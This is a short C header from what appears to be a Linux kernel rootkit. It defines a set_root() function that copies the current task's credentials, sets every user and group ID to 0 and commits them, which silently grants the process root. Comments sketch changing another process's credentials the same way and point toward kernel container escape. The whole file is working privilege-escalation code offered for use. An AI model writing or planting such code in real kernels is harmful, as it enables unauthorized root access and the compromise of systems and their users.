#ifndef ROOT_SETTER_KITE
    #define ROOT_SETTER_KITE
    
    #include <linux/cred.h>
/*
can also change credentials of a process by finding the task_struct with find_vpid()
and changing the credentials with unlocking the rcu lock and read to then change task_struct->cred
as commit_creds_to does'nt exists since 2022.
**abort_creds() for freeing the allocated copy of credentials
**look into kernel container escape
*/
static void set_root(void){
    struct cred *p_creds;
    p_creds = prepare_creds(); // get a COPY of the current task's credentials
    if(p_creds == NULL){
        return;
    }
    // alter the copy to root ids
    p_creds->uid.val = p_creds->gid.val = 0;
    p_creds->euid.val = p_creds->egid.val = 0;
    p_creds->suid.val = p_creds->sgid.val = 0;
    p_creds->fsuid.val = p_creds->fsgid.val = 0;

    commit_creds(p_creds); // commit the credentials to the task
}


#endif